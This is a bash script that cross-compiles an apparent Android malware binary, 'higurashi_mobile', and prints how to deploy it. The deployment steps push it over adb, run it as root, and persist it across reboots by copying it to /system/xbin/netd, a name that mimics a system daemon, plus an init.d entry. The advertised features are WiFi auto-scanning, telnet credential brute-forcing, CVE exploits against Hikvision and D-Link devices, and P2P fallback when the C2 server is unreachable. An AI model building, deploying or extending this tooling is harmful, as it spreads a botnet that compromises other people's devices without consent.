#!/bin/bash
# compile_mobile.sh - Compile Higurashi for Android devices

echo "╔══════════════════════════════════════════════════════════════════════════╗"
echo "║           HIGURASHI MOBILE - Android Compilation Script                 ║"
echo "╚══════════════════════════════════════════════════════════════════════════╝"
echo ""

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Check for Android NDK
if [ -z "$ANDROID_NDK_HOME" ]; then
    echo -e "${YELLOW}[!] ANDROID_NDK_HOME not set${NC}"
    echo -e "${YELLOW}[!] Trying common locations...${NC}"
    
    NDK_PATHS=(
        "$HOME/Android/Sdk/ndk/25.2.9519653"
        "$HOME/android-ndk-r25c"
        "/opt/android-ndk"
        "/usr/local/android-ndk"
    )
    
    for path in "${NDK_PATHS[@]}"; do
        if [ -d "$path" ]; then
            export ANDROID_NDK_HOME="$path"
            echo -e "${GREEN}[✓] Found NDK at: $path${NC}"
            break
        fi
    done
    
    if [ -z "$ANDROID_NDK_HOME" ]; then
        echo -e "${RED}[✗] Android NDK not found!${NC}"
        echo ""
        echo "Please install Android NDK:"
        echo "  1. Download from: https://developer.android.com/ndk/downloads"
        echo "  2. Extract to ~/android-ndk-r25c"
        echo "  3. export ANDROID_NDK_HOME=~/android-ndk-r25c"
        echo ""
        exit 1
    fi
fi

# NDK compiler paths
NDK_TOOLCHAIN="$ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64"
CC_ARM64="$NDK_TOOLCHAIN/bin/aarch64-linux-android21-clang"
CC_ARM32="$NDK_TOOLCHAIN/bin/armv7a-linux-androideabi21-clang"
CC_X86="$NDK_TOOLCHAIN/bin/i686-linux-android21-clang"
CC_X86_64="$NDK_TOOLCHAIN/bin/x86_64-linux-android21-clang"

echo ""
echo "╔══════════════════════════════════════════════════════════════════════════╗"
echo "║ [1/4] Compiling for ARM64 (aarch64)                                     ║"
echo "╚══════════════════════════════════════════════════════════════════════════╝"

$CC_ARM64 -static -O2 -o higurashi_mobile_arm64 higurashi_mobile.c -lpthread 2>&1 | grep -v "warning"

if [ $? -eq 0 ]; then
    SIZE=$(stat -f%z higurashi_mobile_arm64 2>/dev/null || stat -c%s higurashi_mobile_arm64 2>/dev/null)
    SIZE_KB=$((SIZE / 1024))
    echo -e "${GREEN}[✓] higurashi_mobile_arm64 compiled successfully (${SIZE_KB} KB)${NC}"
else
    echo -e "${RED}[✗] ARM64 compilation failed${NC}"
fi

echo ""
echo "╔══════════════════════════════════════════════════════════════════════════╗"
echo "║ [2/4] Compiling for ARM32 (armv7)                                       ║"
echo "╚══════════════════════════════════════════════════════════════════════════╝"

$CC_ARM32 -static -O2 -o higurashi_mobile_arm32 higurashi_mobile.c -lpthread 2>&1 | grep -v "warning"

if [ $? -eq 0 ]; then
    SIZE=$(stat -f%z higurashi_mobile_arm32 2>/dev/null || stat -c%s higurashi_mobile_arm32 2>/dev/null)
    SIZE_KB=$((SIZE / 1024))
    echo -e "${GREEN}[✓] higurashi_mobile_arm32 compiled successfully (${SIZE_KB} KB)${NC}"
else
    echo -e "${RED}[✗] ARM32 compilation failed${NC}"
fi

echo ""
echo "╔══════════════════════════════════════════════════════════════════════════╗"
echo "║ [3/4] Compiling for x86_64                                              ║"
echo "╚══════════════════════════════════════════════════════════════════════════╝"

$CC_X86_64 -static -O2 -o higurashi_mobile_x86_64 higurashi_mobile.c -lpthread 2>&1 | grep -v "warning"

if [ $? -eq 0 ]; then
    SIZE=$(stat -f%z higurashi_mobile_x86_64 2>/dev/null || stat -c%s higurashi_mobile_x86_64 2>/dev/null)
    SIZE_KB=$((SIZE / 1024))
    echo -e "${GREEN}[✓] higurashi_mobile_x86_64 compiled successfully (${SIZE_KB} KB)${NC}"
else
    echo -e "${RED}[✗] x86_64 compilation failed${NC}"
fi

echo ""
echo "╔══════════════════════════════════════════════════════════════════════════╗"
echo "║ [4/4] Compiling for x86 (32-bit)                                        ║"
echo "╚══════════════════════════════════════════════════════════════════════════╝"

$CC_X86 -static -O2 -o higurashi_mobile_x86 higurashi_mobile.c -lpthread 2>&1 | grep -v "warning"

if [ $? -eq 0 ]; then
    SIZE=$(stat -f%z higurashi_mobile_x86 2>/dev/null || stat -c%s higurashi_mobile_x86 2>/dev/null)
    SIZE_KB=$((SIZE / 1024))
    echo -e "${GREEN}[✓] higurashi_mobile_x86 compiled successfully (${SIZE_KB} KB)${NC}"
else
    echo -e "${RED}[✗] x86 compilation failed${NC}"
fi

echo ""
echo "╔══════════════════════════════════════════════════════════════════════════╗"
echo "║                        COMPILATION SUMMARY                               ║"
echo "╠══════════════════════════════════════════════════════════════════════════╣"

if [ -f higurashi_mobile_arm64 ]; then
    echo "║ ✓ higurashi_mobile_arm64   │ For modern Android phones (64-bit)       ║"
fi
if [ -f higurashi_mobile_arm32 ]; then
    echo "║ ✓ higurashi_mobile_arm32   │ For older Android phones (32-bit)        ║"
fi
if [ -f higurashi_mobile_x86_64 ]; then
    echo "║ ✓ higurashi_mobile_x86_64  │ For Android emulators (64-bit)           ║"
fi
if [ -f higurashi_mobile_x86 ]; then
    echo "║ ✓ higurashi_mobile_x86     │ For Android emulators (32-bit)           ║"
fi

echo "╚══════════════════════════════════════════════════════════════════════════╝"
echo ""
echo "╔══════════════════════════════════════════════════════════════════════════╗"
echo "║                         DEPLOYMENT INSTRUCTIONS                          ║"
echo "╚══════════════════════════════════════════════════════════════════════════╝"
echo ""
echo "1. TRANSFER TO ANDROID DEVICE:"
echo "   adb push higurashi_mobile_arm64 /data/local/tmp/hm"
echo ""
echo "2. SET PERMISSIONS:"
echo "   adb shell chmod 755 /data/local/tmp/hm"
echo ""
echo "3. RUN (No root required for basic features):"
echo "   adb shell /data/local/tmp/hm"
echo ""
echo "4. WITH ROOT (Full features):"
echo "   adb shell su -c '/data/local/tmp/hm'"
echo ""
echo "5. AUTO-START ON BOOT (Requires root):"
echo "   adb shell su -c 'cp /data/local/tmp/hm /system/xbin/netd'"
echo "   adb shell su -c 'echo \"/system/xbin/netd &\" >> /system/etc/init.d/99netd'"
echo ""
echo "╔══════════════════════════════════════════════════════════════════════════╗"
echo "║                        FEATURES ENABLED                                  ║"
echo "╠══════════════════════════════════════════════════════════════════════════╣"
echo "║ ✓ Auto-scan on WiFi change   │ Detects new networks automatically       ║"
echo "║ ✓ Telnet exploitation         │ Brute-force common credentials           ║"
echo "║ ✓ HTTP CVE exploits           │ Hikvision, D-Link, etc.                  ║"
echo "║ ✓ P2P peer discovery          │ Works without C2 server                  ║"
echo "║ ✓ Multi-threaded scanning     │ 20 threads for fast discovery            ║"
echo "║ ✓ Auto-persistence            │ Survives reboots (with root)             ║"
echo "╚══════════════════════════════════════════════════════════════════════════╝"
echo ""
echo "⚠️  IMPORTANT NOTES:"
echo "  - No root: WiFi scanning and exploitation work"
echo "  - With root: Full persistence + raw sockets"
echo "  - Auto-scans EVERY TIME you connect to new WiFi"
echo "  - P2P mode activates if C2 is unreachable"
echo ""
